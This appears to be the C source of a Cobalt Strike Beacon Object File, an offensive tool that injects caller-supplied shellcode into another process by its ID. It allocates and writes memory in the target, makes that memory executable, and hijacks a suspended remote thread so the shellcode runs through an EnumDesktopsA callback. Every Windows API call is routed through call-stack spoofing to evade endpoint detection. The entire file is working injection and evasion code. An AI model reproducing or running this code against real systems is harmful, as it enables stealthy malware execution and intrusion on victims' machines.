#include <windows.h>

#include "Prototypes.h"
#include "Beacon.h"
#include "Vulcan.h"
#include "Ntdll.h"
#include "Macros.h"
#include "Bofdefs.h"

void go(char *args, int len) 
{

	datap parser;
	DWORD procID;
	SIZE_T shellcodeSize = NULL;
	char *shellcode;

	BeaconDataParse(&parser, args, len);
	procID = BeaconDataInt(&parser);
	shellcode = BeaconDataExtract(&parser, &shellcodeSize);

	BeaconPrintf(CALLBACK_OUTPUT, "Shellcode size: %d", shellcodeSize);

	SYNTHETIC_STACK_FRAME   stackFrame = { 0 };
	if (!InitFrameInfo(&stackFrame))
	{
		BeaconPrintf(CALLBACK_OUTPUT,"[!] Fail to init stack frame !\n");
	}

	HMODULE hKernel32 = GetModuleHandleA("Kernel32.dll");
	HMODULE hNtdll = GetModuleHandleA("Ntdll.dll");

	void* pOpenProcess 			= GetProcAddress(hKernel32, "OpenProcess");
	void* pVirtualAllocEx 		= GetProcAddress(hKernel32, "VirtualAllocEx");
	void* pWriteProcessMemory	= GetProcAddress(hKernel32, "WriteProcessMemory");	
	void* pVirtualProtectEx		= GetProcAddress(hKernel32, "VirtualProtectEx");
	void* pCreateRemoteThread	= GetProcAddress(hKernel32, "CreateRemoteThread");
	void* pGetThreadContext		= GetProcAddress(hKernel32, "GetThreadContext");
	void* pSetThreadContext		= GetProcAddress(hKernel32, "SetThreadContext");
	void* pResumeThread			= GetProcAddress(hKernel32, "ResumeThread");
	void* pLoadLibraryA 		= GetProcAddress(hKernel32, "LoadLibraryA");

	if (
		!pOpenProcess 			||
		!pVirtualAllocEx 		||
		!pWriteProcessMemory 	||
		!pVirtualProtectEx 		||
		!pCreateRemoteThread 	||
		!pGetThreadContext 		||
		!pSetThreadContext 		||
		!pResumeThread 			||
		!pLoadLibraryA			
		)
	{
		BeaconPrintf(CALLBACK_ERROR, "Error during solving addr of Kernel32 function !\nOpenProcess : %p\nVirtualAllocEx : %p\nWriteProcessMemory : %p\nVirtualProtectEx : %p\nCreateRemoteThread : %p\nGetThreadContext : %p\nSetThreadContext : %p\nResumeThread : %p\nLoadLibraryA : %p\n",
					 pOpenProcess, pVirtualAllocEx, pWriteProcessMemory, pVirtualProtectEx, pCreateRemoteThread, pGetThreadContext, pSetThreadContext, pResumeThread, pLoadLibraryA);
		return 0;
	}

	void* pRtlUserThreadStart	= GetProcAddress(hNtdll, "RtlUserThreadStart");
	pRtlUserThreadStart 		+= 0x21;

	void* pUser32 				= SPOOF_CALL(&stackFrame, pLoadLibraryA, (void*)"User32.dll");
	void* pEnumDesktopsA		= GetProcAddress(pUser32, "EnumDesktopsA");

	if(
		!pRtlUserThreadStart ||
		!pEnumDesktopsA
	)
	{
		BeaconPrintf(CALLBACK_ERROR, "Error during solving addr of User32 and/or Ntdll !\nRtlUserThreadStart : %p\nEnumDesktopsA : %p\n", pRtlUserThreadStart, pEnumDesktopsA);
		return 0;
	}

	HANDLE hProcess = SPOOF_CALL(&stackFrame, pOpenProcess, PROCESS_ALL_ACCESS, FALSE, procID);
	if(hProcess == NULL)
	{
		BeaconPrintf(CALLBACK_ERROR, "Can't take HANDLE on remote process ! ERROR : %d", GetLastError());
		return 0;
	}

	void* pAllocatedAddr = SPOOF_CALL(&stackFrame, pVirtualAllocEx, hProcess, NULL, shellcodeSize, MEM_COMMIT, PAGE_READWRITE);
	if(pAllocatedAddr == NULL)
	{
		BeaconPrintf(CALLBACK_ERROR, "Can't allocate memory on remote process ! ERROR : %d", GetLastError());
		return 0;
	}
	BeaconPrintf(CALLBACK_OUTPUT, "Alocated addr : %p", pAllocatedAddr);

	SIZE_T outWrite= 0;
	if(!
		SPOOF_CALL(&stackFrame, pWriteProcessMemory, hProcess, pAllocatedAddr, shellcode, shellcodeSize, &outWrite)
	)
	{
		BeaconPrintf(CALLBACK_ERROR, "Error during WriteProcessMemory ! ERROR : %d", GetLastError());
		return 0;
	}

	DWORD dwOldProtect = 0;
	if(!
		SPOOF_CALL(&stackFrame, pVirtualProtectEx, hProcess, pAllocatedAddr, shellcodeSize, PAGE_EXECUTE_READ, &dwOldProtect)
	)
	{
		BeaconPrintf(CALLBACK_ERROR, "Can't take change protection on remote process ! ERROR : %d", GetLastError());
		return 0;
	}

	DWORD dwRemoteTid = 0;
	HANDLE hThread = SPOOF_CALL(&stackFrame, pCreateRemoteThread, hProcess, NULL, 0, pRtlUserThreadStart, NULL, CREATE_SUSPENDED, &dwRemoteTid);
	BeaconPrintf(CALLBACK_OUTPUT, "Remote TID : %d", dwRemoteTid);

	CONTEXT ctx = { 0 };
	ctx.ContextFlags = CONTEXT_ALL;

	if(!
	SPOOF_CALL(&stackFrame, pGetThreadContext, hThread, &ctx)
	)
	{
		BeaconPrintf(CALLBACK_ERROR, "Can't take thread context ! ERROR : %d", GetLastError());
		return 0;
	}

	ctx.Rip = (DWORD64)pEnumDesktopsA;
	ctx.Rcx = 0;
	ctx.Rdx = (DWORD64)pAllocatedAddr;


	if(!
	SPOOF_CALL(&stackFrame, pSetThreadContext, hThread, &ctx)
	)
	{
		BeaconPrintf(CALLBACK_ERROR, "Can't set thread context ! ERROR : %d", GetLastError());
		return 0;
	}

	SPOOF_CALL(&stackFrame, pResumeThread, hThread);
	
	BeaconPrintf(CALLBACK_OUTPUT, "Shellcode run with success !");
}